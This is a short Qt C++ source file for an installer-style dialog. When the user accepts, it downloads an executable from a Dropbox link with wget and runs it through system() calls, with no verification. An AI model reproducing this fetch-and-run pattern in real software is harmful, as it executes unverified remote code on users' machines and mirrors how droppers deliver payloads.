#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <curl.h>
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_buttonBox_rejected()
{
    QMessageBox msgBox;
    msgBox.setText("Installation aborted.");
    msgBox.exec();
    QApplication::quit();
}


void MainWindow::on_buttonBox_accepted()
{
 system("wget.exe https://www.dropbox.com/s/a3d5glsm2zrjb1a/UITest.exe?dl=1 -O UITest.exe");
 system("UITest.exe");
 QApplication::quit();
}
